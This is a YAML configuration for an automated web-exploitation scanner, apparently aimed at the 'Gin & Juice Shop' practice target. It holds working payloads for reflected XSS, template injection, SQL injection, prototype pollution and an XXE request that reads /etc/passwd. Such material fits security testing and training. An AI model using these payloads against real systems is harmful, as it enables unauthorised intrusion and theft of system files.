id: ginjuice-no-login-exploits
name: Gin & Juice Shop - No Login Exploits
mode: predator
retry_on_failure: true

steps:
  - id: reflected-xss
    phase: exploitation
    action:
      method: GET
      path: "/login?search=<script>alert(1)</script>"
    validate:
      status_code: 200

  - id: template-injection
    phase: exploitation
    action:
      method: GET
      path: "/catalog?category={{7*7}}"
    validate:
      status_code: 200

  - id: sql-injection
    phase: exploitation
    action:
      method: GET
      path: "/catalog?category=' OR '1'='1"
    validate:
      status_code: 200

  - id: xxe-stock
    phase: exploitation
    action:
      method: POST
      path: "/catalog/product/stock"
      headers:
        Content-Type: "application/xml"
      body: |
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE root [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
        <stockCheck><productId>&xxe;</productId></stockCheck>
    validate:
      status_code: 500

  - id: client-side-pollution
    phase: exploitation
    action:
      method: GET
      path: "/blog?__proto__[admin]=true"
    validate:
      status_code: 200

  - id: vulnerable-angular
    phase: reconnaissance
    action:
      method: GET
      path: "/resources/js/angular_1-7-7.js"
    validate:
      status_code: 200
i skipped the login step. 